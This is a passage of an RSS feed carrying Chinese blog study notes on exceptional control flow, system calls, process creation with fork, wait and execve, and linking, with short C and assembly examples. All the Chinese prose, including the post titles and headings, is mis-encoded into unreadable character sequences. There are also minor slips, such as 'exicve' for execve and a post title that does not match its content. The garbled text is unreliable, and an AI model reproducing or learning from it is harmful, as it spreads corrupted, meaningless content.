</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Sat, 01 Feb 2025 16:00:00 GMT</pubDate></item><item><title>å¼‚å¸¸æ§åˆ¶æµ(ä¿¡å·å’Œéå±€éƒ¨è·³è½¬)</title><link>https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E5%BC%82%E5%B8%B8%E5%92%8C%E8%BF%9B%E7%A8%8B/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E5%BC%82%E5%B8%B8%E5%92%8C%E8%BF%9B%E7%A8%8B/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E5%BC%82%E5%B8%B8%E5%92%8C%E8%BF%9B%E7%A8%8B/&quot;&gt;https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E5%BC%82%E5%B8%B8%E5%92%8C%E8%BF%9B%E7%A8%8B/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;æ§åˆ¶æµ:å¤„ç†å™¨ä»å¼€æœºåˆ°å…³æœºåªåšä¸€ä»¶äº‹:è¯»å–å’Œæ‰§è¡Œä¸€ç³»åˆ—æŒ‡ä»¤,è¿™äº›æŒ‡ä»¤å°±å«CPUçš„æ§åˆ¶æµ.&lt;/p&gt;
&lt;h1&gt;å¼‚å¸¸æ§åˆ¶æµ(ECF:Exceptional Control Flow)&lt;/h1&gt;
&lt;p&gt;ECFå­˜åœ¨äºè®¡ç®—æœºç³»ç»Ÿçš„æ‰€æœ‰å±‚æ¬¡&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;åº•å±‚æœºåˆ¶&lt;ul&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;å¼‚å¸¸:ç”±ç³»ç»ŸçŠ¶æ€æ”¹å˜å¼•å‘,ç”±ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿè½¯ä»¶å…±åŒå®ç°.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;é«˜å±‚æœºåˆ¶&lt;ul&gt;
&lt;li&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ä¸Šä¸‹æ–‡åˆ‡æ¢&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;ä¿¡å·&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;éå±€éƒ¨è·³è½¬&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å¼‚å¸¸(Exception)&lt;/h1&gt;
&lt;p&gt;å¼‚å¸¸æ˜¯å°†æ§åˆ¶æƒäº¤ç»™æ“ä½œç³»ç»Ÿå†…æ ¸,ä½œä¸ºå¯¹æŸäº›äº‹ä»¶çš„å›åº”.
å†…æ ¸æ˜¯æ“ä½œç³»ç»Ÿå§‹ç»ˆé©»ç•™åœ¨å†…å­˜ä¸­çš„éƒ¨åˆ†.
äº‹ä»¶å¦‚:é™¤ä»¥0/ç®—æœ¯æº¢å‡º/é¡µé”™è¯¯/IOè¯·æ±‚å®Œæˆ/Ctrl+C.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201175658.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;å¼‚å¸¸è¡¨&lt;/h2&gt;
&lt;p&gt;æ¯ç§å¼‚å¸¸äº‹ä»¶éƒ½æœ‰ä¸€ä¸ªå¼‚å¸¸ç ,å½“å¼‚å¸¸äº‹ä»¶kå‘ç”Ÿæ—¶,ç¡¬ä»¶ä½¿ç”¨kä½œä¸ºå¼‚å¸¸è¡¨çš„ç´¢å¼•,ç„¶åè·³è½¬åˆ°å¤„ç†è¯¥å¼‚å¸¸çš„ç¨‹åºçš„åœ°å€å¤„.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201180030.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;å¼‚æ­¥å¼‚å¸¸(ä¸­æ–­)&lt;/h2&gt;
&lt;p&gt;ç”±å¤„ç†å™¨å¤–éƒ¨è®¾å¤‡å¼•å‘.é€šè¿‡åœ¨å¤„ç†å™¨ä¸Šè®¾ç½®å¼•è„š,å‘å¤„ç†å™¨é€šçŸ¥è¿™äº›çŠ¶æ€çš„å˜åŒ–.å‘ç”Ÿä¸­æ–­å,å¤„ç†å™¨è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤.
ä¾‹å¦‚:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è®¡æ—¶å™¨ä¸­æ–­
  ç³»ç»Ÿæœ‰ä¸€ä¸ªå†…ç½®è®¡æ—¶å™¨,æ¯éš”å‡ æ¯«ç§’å°±ä¸­æ–­ä¸€æ¬¡.
  å†…æ ¸ç”¨è¿™ä¸ªæœºåˆ¶å†æ¬¡å–å¾—å¯¹ç”¨æˆ·ç¨‹åºçš„æ§åˆ¶æƒ.&lt;/li&gt;
&lt;li&gt;I/Oä¸­æ–­
  Ctrl+C/æ”¶åˆ°ç½‘ç»œåŒ…/æ”¶åˆ°ç£ç›˜æ•°æ®&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;åŒæ­¥å¼‚å¸¸&lt;/h2&gt;
&lt;p&gt;ç”±ä»¥ä¸‹ä¸‰ç§å¼•å‘:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é™·é˜±(Traps)
  ç¨‹åºæ•…æ„å¼•å‘çš„.å¦‚ç³»ç»Ÿè°ƒç”¨.è¿”å›åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤&lt;/li&gt;
&lt;li&gt;é”™è¯¯(Faults)
  éæ•…æ„ä½†å¯èƒ½å¯ä»¥æ¢å¤.å¦‚é¡µé”™è¯¯&lt;/li&gt;
&lt;li&gt;ç»ˆæ­¢(Aborts)
  éæ•…æ„ä¸”ä¸å¯æ¢å¤&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ç³»ç»Ÿè°ƒç”¨&lt;/h3&gt;
&lt;p&gt;æ¯ä¸€ä¸ªx86-64ç³»ç»Ÿè°ƒç”¨éƒ½æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ID,å¦‚:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;åç§°&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;read&lt;/td&gt;
&lt;td&gt;read file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;write&lt;/td&gt;
&lt;td&gt;write file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;open&lt;/td&gt;
&lt;td&gt;open file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;close&lt;/td&gt;
&lt;td&gt;close file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;stat&lt;/td&gt;
&lt;td&gt;get info about file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;57&lt;/td&gt;
&lt;td&gt;fork&lt;/td&gt;
&lt;td&gt;åˆ›å»ºè¿›ç¨‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;59&lt;/td&gt;
&lt;td&gt;execve&lt;/td&gt;
&lt;td&gt;æ‰§è¡Œç¨‹åº&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;td&gt;_exit&lt;/td&gt;
&lt;td&gt;ç»ˆæ­¢è¿›ç¨‹&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;62&lt;/td&gt;
&lt;td&gt;kill&lt;/td&gt;
&lt;td&gt;å‘è¿›ç¨‹å‘é€ä¿¡å·&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;è°ƒç”¨ &lt;code&gt;open(filename, options)&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;00000000000e5d70 &amp;lt;__open&amp;gt;: 
... 
e5d79: b8 02 00 00 00        mov $0x2,%eax # open is syscall #2 
e5d7e: 0f 05                 syscall       # Return value in %rax 
e5d80: 48 3d 01 f0 ff ff     cmp $0xfffffffffffff001,%rax 
... 
e5dfa: c3                    retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;%raxåŒ…å«è°ƒç”¨ID;å¦‚æœopenå‡ºé”™,ä¼šè¿”å›è´Ÿæ•°çš„errno,æ‰§è¡Œå¯¹åº”çš„é”™è¯¯å¤„ç†.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201183604.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;é¡µé”™è¯¯&lt;/h3&gt;
&lt;p&gt;ç£ç›˜ä¸Šçš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶å¯èƒ½å¾ˆå¤§,æ ¹æ®å±€éƒ¨æ€§åŸç†,åªæœ‰ä¸€éƒ¨åˆ†åŠ è½½åˆ°å†…å­˜ä¸­,å½“æ‰§è¡Œæ¶‰åŠçš„å†…å­˜åŒºåŸŸæ²¡æœ‰è¢«åŠ è½½è¿‡æ¥æ—¶å°±ä¼šå‘ç”Ÿé¡µç¼ºå¤±å¼‚å¸¸.è¿™æ—¶å€™éœ€è¦å»ç¡¬ç›˜ä¸­æŠŠè¿™éƒ¨åˆ†å†…å­˜åŠ è½½è¿›æ¥.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201184544.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;æ— æ•ˆå†…å­˜å¼•ç”¨&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201184825.png&quot; alt=&quot;&quot;&gt;
å†…æ ¸å‘ç”¨æˆ·è¿›ç¨‹å‘é€SIGSEGVä¿¡å·,ç”¨æˆ·è¿›ç¨‹segmentation fault é€€å‡º.&lt;/p&gt;
&lt;h1&gt;è¿›ç¨‹(Process)&lt;/h1&gt;
&lt;p&gt;è¿›ç¨‹æ˜¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„å®ä¾‹.
è¿›ç¨‹çš„ä¸¤ä¸ªå…³é”®æŠ½è±¡:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€»è¾‘æ§åˆ¶æµ
  æ¯ä¸ªè¿›ç¨‹ä¼¼ä¹ç‹¬å CPU:ä¸ç”¨æ‹…å¿ƒåˆ«çš„ç¨‹åºä¼šä¿®æ”¹å¯„å­˜å™¨,ä¹Ÿæ— æ³•åˆ†è¾¨ç³»ç»Ÿä¸­æœ‰å…¶ä»–è¿›ç¨‹æ­£åœ¨è¿è¡Œ.&lt;/li&gt;
&lt;li&gt;ç§æœ‰åœ°å€ç©ºé—´
  è™šæ‹Ÿå†…å­˜æœºåˆ¶æä¾›,æ¯ä¸ªè¿›ç¨‹ä¼¼ä¹ç‹¬å å†…å­˜:éƒ½æœ‰å†…å­˜ç©ºé—´,ä¹Ÿä¸èƒ½çœ‹åˆ°å…¶ä»–è¿›ç¨‹æ­£åœ¨ä½¿ç”¨çš„å†…å­˜.
å³ä½¿åœ¨å•æ ¸ç³»ç»Ÿä¸Š,è¿™äº›è¿›ç¨‹å®é™…ä¸Šæ˜¯åœ¨åŒä¸€æ—¶é—´å¹¶å‘è¿è¡Œ
(æˆ‘çš„1vCPUæœåŠ¡å™¨,topç•Œé¢å‡ºç°äº†2 running)
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201231945.png&quot; alt=&quot;&quot;&gt;
æ“ä½œç³»ç»Ÿå¦‚ä½•å®ç°å¤šè¿›ç¨‹è°ƒåº¦?&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;å•æ ¸ç³»ç»Ÿ
 å•æ ¸å¤„ç†å™¨ &lt;strong&gt;å¹¶å‘(concurrently)&lt;/strong&gt; å¤„ç†å¤šä¸ªè¿›ç¨‹
 å½“å¼‚å¸¸å‘ç”Ÿæ—¶,æ“ä½œç³»ç»Ÿå¯ä»¥å†³å®šæ˜¯å¦è¦è¿è¡Œå¦ä¸€ä¸ªè¿›ç¨‹
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201232845.png&quot; alt=&quot;&quot;&gt;
 è¿›ç¨‹åˆ‡æ¢æ—¶,å°†å¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ°å†…å­˜ä¸­ä¿å­˜,ç„¶åè°ƒåº¦åˆ°ä¸‹ä¸€ä¸ªå¾…æ‰§è¡Œçš„è¿›ç¨‹
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201232903.png&quot; alt=&quot;&quot;&gt;
 å®ƒå°†åŠ è½½ä¸Šæ¬¡ä¿å­˜çš„å¯„å­˜å™¨çš„å€¼,åœ°å€ç©ºé—´ä¹Ÿå°†åˆ‡æ¢.
 **ä¸Šä¸‹æ–‡åˆ‡æ¢(context switch)**å°±æ˜¯å¯„å­˜å™¨å’Œåœ°å€ç©ºé—´çš„åˆ‡æ¢.&lt;/li&gt;
&lt;li&gt;å¤šæ ¸ç³»ç»Ÿ
 æ¯ä¸ªæ ¸å¤„ç†ä¸€ä¸ªè¿›ç¨‹,ä¹Ÿä¼šå‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢.
 &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201234209.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å¹¶å‘,é¡ºåº,å¹¶è¡Œ
   &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201235607.png&quot; alt=&quot;&quot;&gt;
   &lt;strong&gt;å¹¶å‘(concurrent)&lt;/strong&gt; : A&amp;amp;B,A&amp;C;  &lt;strong&gt;é¡ºåº(sequential)&lt;/strong&gt; : B&amp;amp;C
   &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201235722.png&quot; alt=&quot;&quot;&gt;
   A&amp;amp;B,A&amp;amp;C &lt;strong&gt;å¹¶è¡Œ(parallel)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;ä¸Šä¸‹æ–‡åˆ‡æ¢
  æ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯ä¸€ä¸ªé€»è¾‘æ§åˆ¶æµ.å†…æ ¸ç®¡ç†è¿›ç¨‹,é€šè¿‡&lt;strong&gt;ä¸Šä¸‹æ–‡åˆ‡æ¢&lt;/strong&gt;,æ§åˆ¶æµä»ä¸€ä¸ªè¿›ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹.
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250202000758.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;è¿›ç¨‹æ§åˆ¶(Process Control)&lt;/h1&gt;
&lt;h2&gt;ç³»ç»Ÿè°ƒç”¨çš„é”™è¯¯å¤„ç†&lt;/h2&gt;
&lt;p&gt;Linuxç³»ç»Ÿå±‚é¢å‡½æ•°ä¸€æ—¦å‘ç”Ÿé”™è¯¯,ç»å¸¸è¿”å›-1,å¹¶ä¸”è®¾ç½®å…¨å±€å˜é‡errnoçš„å€¼æ¥æŒ‡ç¤ºåŸå› .è¿”å›æŒ‡é’ˆ(å¥æŸ„)çš„å‡½æ•°å‘ç”Ÿé”™è¯¯è¿”å›ç©ºæŒ‡é’ˆ.
ä¸ºäº†å®‰å…¨,åœ¨è°ƒç”¨ç³»ç»Ÿå‡½æ•°æ—¶,å¿…é¡»æ£€æŸ¥è¿”å›å€¼.ä¾‹å¦‚,æˆ‘ä»¬å¯ä»¥å°†&lt;code&gt;fork&lt;/code&gt;å‡½æ•°åŒ…è£…æˆ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void unix_error(char *msg){
	fprintf(stderr, &amp;quot;%s: %s\n&amp;quot;, msg, strerror(errno));
	exit(0);
}
pid_t Fork(void){
	pid_t pid;
	if((pid = fork()) &amp;lt; 0)
		unix_error(&amp;quot;Fork error&amp;quot;);
	return pid;
}

pid = Fork();
pid_t getpid(void);     /*è·å–å½“å‰è¿›ç¨‹çš„PID */
pid_t getppid(void);    /* è·å–çˆ¶è¿›ç¨‹çš„PID */
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;åˆ›å»º/ç»ˆæ­¢è¿›ç¨‹&lt;/h2&gt;
&lt;p&gt;è¿›ç¨‹å¤„åœ¨ä»¥ä¸‹ä¸‰ç§çŠ¶æ€ä¹‹ä¸€:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è¿è¡Œ
 è¿›ç¨‹æ­£åœ¨è¢«æ‰§è¡Œ,æˆ–è€…ç­‰å¾…æ‰§è¡Œå¹¶ä¸”åé¢ä¼šè¢«å†…æ ¸è°ƒåº¦.&lt;/li&gt;
&lt;li&gt;åœæ­¢
 æš‚åœæ‰§è¡Œ,å¹¶ä¸”åœ¨è¿›ä¸€æ­¥é€šçŸ¥ä¹‹å‰ä¸ä¼šè°ƒåº¦.&lt;/li&gt;
&lt;li&gt;ç»ˆæ­¢
 æ°¸ä¹…åœæ­¢&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹çš„ä¸‰ç§æ–¹å¼:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ”¶åˆ°ä¸€ä¸ªä¿¡å·,é»˜è®¤æ˜¯ç»ˆæ­¢è¿›ç¨‹&lt;/li&gt;
&lt;li&gt;ä»&lt;code&gt;main&lt;/code&gt;å‡½æ•°æ­£å¸¸è¿”å›&lt;/li&gt;
&lt;li&gt;è°ƒç”¨äº†&lt;code&gt;exit&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;åˆ›å»ºè¿›ç¨‹:&lt;/h3&gt;
&lt;p&gt;çˆ¶è¿›ç¨‹é€šè¿‡è°ƒç”¨&lt;code&gt;fork&lt;/code&gt;å‡½æ•°èƒ½åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹.å­è¿›ç¨‹æ˜¯çˆ¶è¿›ç¨‹çš„å‰¯æœ¬.
&lt;code&gt;int fork(void)&lt;/code&gt;å‡½æ•°åœ¨å­è¿›ç¨‹è¿”å›0,åœ¨çˆ¶è¿›ç¨‹è¿”å›å­è¿›ç¨‹çš„PID.
å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹å¹¶è¡Œæ‰§è¡Œ,æ— æ³•ä¿è¯å“ªä¸€ä¸ªå…ˆæ‰§è¡Œ.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™éƒ¨åˆ†ç¼–ç¨‹,æˆ‘å·²ç»åœ¨ç½‘ç»œç¼–ç¨‹ä¸­æ¥è§¦è¿‡äº†&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é€šè¿‡è¿›ç¨‹å›¾(Process Graph)æ¥ç†è§£fork:
å¯¹äºå¤æ‚çš„è¿›ç¨‹,å¯ä»¥ç”»å‡ºè¿›ç¨‹å›¾æ¥åˆ†æ,ä¾‹å¦‚:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void fork4()
{
	printf(&amp;quot;L0\n&amp;quot;);
	if(fork() != 0){
		printf(&amp;quot;L1\n&amp;quot;);
		if(fork() != 0)
			printf(&amp;quot;L2\n&amp;quot;);
	}
	printf(&amp;quot;Bye\n&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çš„è¿›ç¨‹å›¾:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250202224500.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;å›æ”¶forkè¿›ç¨‹&lt;/h3&gt;
&lt;p&gt;åƒµå°¸è¿›ç¨‹:å½“ç¨‹åºç»ˆæ­¢åä»ç„¶å æœ‰ç³»ç»Ÿèµ„æº
å­è¿›ç¨‹ä¸ä¼šè‡ªåŠ¨å›æ”¶,çˆ¶è¿›ç¨‹å¯ä»¥ä½¿ç”¨&lt;code&gt;wait&lt;/code&gt;æˆ–&lt;code&gt;waitpid&lt;/code&gt;å‡½æ•°å›æ”¶å­è¿›ç¨‹,çˆ¶è¿›ç¨‹å¾—åˆ°å­è¿›ç¨‹é€€å‡ºçŠ¶æ€,å†…æ ¸åˆ é™¤åƒµå°¸å­è¿›ç¨‹.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**åƒµå°¸(Zombie)**è¿›ç¨‹çš„ä¾‹å­:&lt;ol&gt;
&lt;li&gt;å­è¿›ç¨‹é€€å‡ºäº†,çˆ¶è¿›ç¨‹ä¸é€€å‡º&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void fork7() { 
    if (fork() == 0) { 
        /* Child */ 
        printf(&amp;quot;Terminating Child, PID = %d\n&amp;quot;, getpid());
        exit(0); 
    } else { 
        printf(&amp;quot;Running Parent, PID = %d\n&amp;quot;, getpid()); 
        while (1) ; 
        /* Infinite loop */ 
    } 
}
&lt;/code&gt;&lt;/pre&gt;
killçˆ¶è¿›ç¨‹å,initè¿›ç¨‹å›æ”¶å­è¿›ç¨‹.&lt;/li&gt;
&lt;li&gt;çˆ¶è¿›ç¨‹é€€å‡ºäº†,å­è¿›ç¨‹ä¸é€€å‡º
 åœ¨çˆ¶è¿›ç¨‹ç»ˆæ­¢å,å­è¿›ç¨‹ä¾ç„¶åœ¨æ´»è·ƒ.killå­è¿›ç¨‹å,å­è¿›ç¨‹æ‰ç»ˆæ­¢.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°,å¦‚æœçˆ¶è¿›ç¨‹ä¸ç®¡ç®¡å­è¿›ç¨‹çš„è¯,æ˜¯å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜çš„.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wait&lt;/code&gt;å‡½æ•°:æš‚åœçˆ¶è¿›ç¨‹ç›´åˆ°ä¸€ä¸ªå­è¿›ç¨‹ç»ˆæ­¢&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int wait(int *child_status);
/* æ•´æ•°*child_statusè¢«è®¾ç½®ä¸ºå­è¿›ç¨‹é€€å‡ºçŠ¶æ€ç  */
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waitpid&lt;/code&gt;å‡½æ•°:æš‚åœå½“å‰è¿›ç¨‹ç›´åˆ°ç‰¹å®šè¿›ç¨‹ç»ˆæ­¢&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;åŠ è½½/è¿è¡Œç¨‹åº&lt;/h3&gt;
&lt;p&gt;è¦åœ¨è¿›ç¨‹å†…è¿è¡Œä¸åŒçš„ç¨‹åº,ä½¿ç”¨åä¸º &lt;code&gt;exicve&lt;/code&gt; çš„å‡½æ•°:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int execve(char *filename, char *argv[], char *envp[]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡è°ƒç”¨ &lt;code&gt;execve&lt;/code&gt; å‡½æ•°,è¿›ç¨‹ä»¥å…¨æ–°ç¨‹åºæ›¿æ¢å½“å‰è¿è¡Œçš„ç¨‹åº,å°†ä¸¢å¼ƒåŸç¨‹åº,,å †æ ˆ/æ•°æ®/ä»£ç éƒ½ä¼šè¢«æ–°ç¨‹åºæ›¿æ¢åªæœ‰PIDä¿ç•™.æ‰€ä»¥ &lt;code&gt;execve&lt;/code&gt;æ°¸è¿œä¸ä¼šè¿”å›,é™¤éæ— æ³•æ‰§è¡Œ.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨ä¾‹
  åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œ&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;/bin/ls -lt /usr/include
&lt;/code&gt;&lt;/pre&gt;
  å‚æ•°ä¸º:
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250202235349.png&quot; alt=&quot;&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;if((pid = Fork())==0){
    /* å­è¿›ç¨‹è¿è¡Œç¨‹åº */
    if(execve(myargv[0], myargv, environ) &amp;lt; 0){
        printf(&amp;quot;%s: Command not found.\n&amp;quot;, myargv[0]);
        exit(1);
    }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Fri, 31 Jan 2025 16:00:00 GMT</pubDate></item><item><title>é“¾æ¥</title><link>https://www.tankimzeg.top/blog/%E9%93%BE%E6%8E%A5/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E9%93%BE%E6%8E%A5/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E9%93%BE%E6%8E%A5/&quot;&gt;https://www.tankimzeg.top/blog/%E9%93%BE%E6%8E%A5/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;é“¾æ¥è¿‡ç¨‹&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* main.c */
int sum(int *a, int n);
int array[2] = {1,2};
int main(){
	int val = sum(array, 2);
	return val;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum.c */
int sum(int *a, int n){
	int i, s = 0;
	for(i=0;i&amp;lt;n;i++){
		s += a[i];	
	}
	return s;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é™æ€é“¾æ¥&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og -o prog main.c sum.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250201110702.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;ä½¿ç”¨é“¾æ¥å™¨çš„åŸå› &lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;æ¨¡å—åŒ–&lt;/li&gt;
&lt;li&gt;é«˜æ•ˆ&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;æ—¶é—´:ä¿®æ”¹ä¸€éƒ¨åˆ†æºæ–‡ä»¶æ— éœ€é‡æ–°ç¼–è¯‘å…¶ä»–æºæ–‡ä»¶&lt;/li&gt;
&lt;li&gt;ç©ºé—´:æå‡å¤ç”¨æ€§(åº“å‡½æ•°)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;è¿æ¥å™¨çš„è¡Œä¸º&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;ç¬¦å·è§£æ(Symbol Resolution)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ç¨‹åºå®šä¹‰å’Œå¼•ç”¨ç¬¦å·(å‡½æ•°å’Œå…¨å±€å˜é‡)&lt;/li&gt;
&lt;li&gt;æ±‡ç¼–å™¨å°†ç¬¦å·å®šä¹‰å­˜å‚¨åœ¨ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨ä¸­&lt;ul&gt;
&lt;li&gt;ç¬¦å·è¡¨æ˜¯ç»“æ„ä½“æ•°ç»„,æ¯ä¸ªæˆå‘˜åŒ…å«åç§°,å¤§å°,ä½ç½®ç­‰ä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ç¬¦å·è§£æè¿‡ç¨‹ä¸­,è¿æ¥å™¨å°†æ¯ä¸ªç¬¦å·å¼•ç”¨è·Ÿç¬¦å·å®šä¹‰å…³è”èµ·æ¥.&lt;ul&gt;
&lt;li&gt;&lt;p&gt;ä¸‰ç±»é“¾æ¥å™¨ç¬¦å·&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å…¨å±€ç¬¦å·
